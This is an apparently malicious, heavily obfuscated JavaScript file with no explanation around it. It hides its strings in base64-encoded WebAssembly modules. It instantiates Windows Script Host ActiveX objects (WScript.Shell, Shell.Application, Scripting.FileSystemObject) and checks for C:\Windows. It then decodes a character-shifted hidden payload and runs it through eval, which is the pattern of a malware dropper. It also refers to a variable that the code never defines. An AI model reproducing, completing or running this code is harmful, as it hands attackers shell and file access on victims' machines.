const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['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MkIlMjYlMkI0Q0ElMjZBMzElMkJBJTJCJTI2QSUyQjhFJTIzKiolM0MAAEGaGAsBAABBnBgLAQAAQZ4YC0dBQkNIS0FCQ0xNJTVDc0FCQ09BQkNmQUJDVHdBQkNhQUJDckUlNUNNQUJDaUFCQ2NyQUJDb3NvQUJDZnQlNUNXQUJDaU5BAABB5hgLS0JDZEFCQ093U0FCQyUyMG50JTVDY3VSUmVBQkNuQUJDdEFCQ3ZFUnNBQkNJb04lNUNTWUFCQ3NBQkN0ZUFCQ21yQUJDb0FCQ09UAABBshkL0gF2WmFaciUyMERaTFpiWkNBR1pJWmRzUFpTWmxLcHlaaFpnWndaJTIwWiUzRCUyMFp1WnFrSFpmbkZaeFpoWlVKWklac1phWkFaaS5aUmVaZ1pSWmVaYWQoZkpaYk5aa1pDYVpWWkJaalpnaFR0WnhaTHBaWS5yZVpwbFphWmNlKCUyRkFCWkMlMkZnJTJDJTIwJTIyWiUyMilaKVouWmNaaFphWnJDWm9kWmVBWnRaKGVyWnRaSVpOWkdaU1pqWlFab1daZlpoWmJacGxaKSUzQgAAQYYbCwEAAEGIGwsOQWN0aXZlWE9iamVjdAAAQZgbCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var BgvMXrYKFsAlnCNiDG = new window[(lS(0, 72, true))](lS(0, 0));
var uqkHfnFxhUJIsaAi = new window[(lS(0, 72, true))](lS(0, 1));
var qcRXLeVhaQKgfxysvu = new window[(lS(0, 72, true))](lS(0, 2));
(() => {
    const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
        env: {
            impFunc1: () => {
                {
                    var lMYPgHmEtLUwXcK = lS(0, 4) + lS(0, 5) + lS(0, 6) + lS(0, 7) + lS(0, 8) + lS(0, 9) + lS(0, 10) + lS(0, 11) + lS(0, 12) + lS(0, 13) + lS(0, 14) + lS(0, 15) + lS(0, 16) + lS(0, 17) + lS(0, 18) + lS(0, 19) + lS(0, 20) + lS(0, 21) + lS(0, 22) + lS(0, 23) + lS(0, 24) + lS(0, 25) + lS(0, 26) + lS(0, 27) + lS(0, 28) + lS(0, 29) + lS(0, 30) + lS(0, 31) + lS(0, 32) + lS(0, 33) + lS(0, 34) + lS(0, 35) + lS(0, 36) + lS(0, 37) + lS(0, 38) + lS(0, 39) + lS(0, 40) + lS(0, 41) + lS(0, 42) + lS(0, 43) + lS(0, 44) + lS(0, 45) + lS(0, 46) + lS(0, 47) + lS(0, 48) + lS(0, 49) + lS(0, 50) + lS(0, 51) + lS(0, 52) + lS(0, 53) + lS(0, 54) + lS(0, 55) + lS(0, 56) + lS(0, 57) + lS(0, 58) + lS(0, 59) + lS(0, 60) + lS(0, 61) + lS(0, 62) + lS(0, 63) + lS(0, 64) + lS(0, 65);
                    var ertINGSjQoWfhbpl = 87374218 / 87374218;
                    var PMqrwOlIRmBTSdg = lS(0, 66);
                    var fJbNkCaVBjghTtxLpY = lS(0, 67) + lS(0, 68) + lS(0, 69);
                    window[lS(0, 73, true)](lS(0, 70).replace(/\Z/g, lS(0, 71)));
                    (() => {
                        var lQLnAarMIohjRwYVsuT = 0;
                        const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
                            env: {
                                test: () => {
                                    return lQLnAarMIohjRwYVsuT < lMYPgHmEtLUwXcK.length ? 1 : 0;
                                },
                                update: () => {
                                    lQLnAarMIohjRwYVsuT++;
                                },
                                body: () => {
                                    {
                                        ertINGSjQoWfhbpl = lMYPgHmEtLUwXcK.charCodeAt(lQLnAarMIohjRwYVsuT) - DLbCAGIdsPSlKpyhgw * 6078 / 352524;
                                        (() => {
                                            const __ifInstance1 = new WebAssembly.Instance(__ifWasmModule, {
                                                env: {
                                                    impFunc1: () => {
                                                        {
                                                            PMqrwOlIRmBTSdg += String.fromCharCode(ertINGSjQoWfhbpl);
                                                        }
                                                    },
                                                    impFunc2: () => {
                                                    }
                                                }
                                            });
                                            const __exports = __ifInstance1.exports;
                                            return __exports.data(ertINGSjQoWfhbpl != DLbCAGIdsPSlKpyhgw * 379008 / 523392 && ertINGSjQoWfhbpl != DLbCAGIdsPSlKpyhgw * 537088 / 486736 ? 1 : 0);
                                        })();
                                    }
                                }
                            }
                        });
                        const __exports = __forInstance0.exports;
                        return __exports.data();
                    })();
                    var GHbDwAKFOYkMQscri = window[lS(0, 73, true)](PMqrwOlIRmBTSdg);
                }
            },
            impFunc2: () => {
            }
        }
    });
    const __exports = __ifInstance0.exports;
    return __exports.data(qcRXLeVhaQKgfxysvu.FolderExists(lS(0, 3)) == true ? 1 : 0);
})();